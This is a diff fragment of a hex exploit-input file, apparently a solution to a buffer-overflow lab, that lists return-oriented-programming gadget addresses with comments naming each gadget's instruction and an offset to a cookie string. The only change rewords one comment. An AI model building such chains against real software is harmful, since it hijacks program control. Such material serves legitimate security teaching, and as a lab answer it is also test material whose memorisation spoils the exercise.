@@ -20,7 +20,7 @@ AA AA AA AA AA AA AA AA
 06 1a 40 00 00 00 00 00     /* jump 0x401a06               movq %rsp, %rax */
 c5 19 40 00 00 00 00 00     /* jump 0x4019c5               movq %rax, %rdi */
 ab 19 40 00 00 00 00 00     /* jump 0x4019ab               popq %rax       */
-48 00 00 00 00 00 00 00     /* distance from here to cookie string         */
+48 00 00 00 00 00 00 00     /* distance from 2nd line after AA to cookie   */
 dd 19 40 00 00 00 00 00     /* jump 0x4019dd               movl %eax, %edx */
 34 1a 40 00 00 00 00 00     /* jump 0x401a34               movl %edx, %ecx */
 13 1a 40 00 00 00 00 00     /* jump 0x401a13               movl %ecx, %esi */
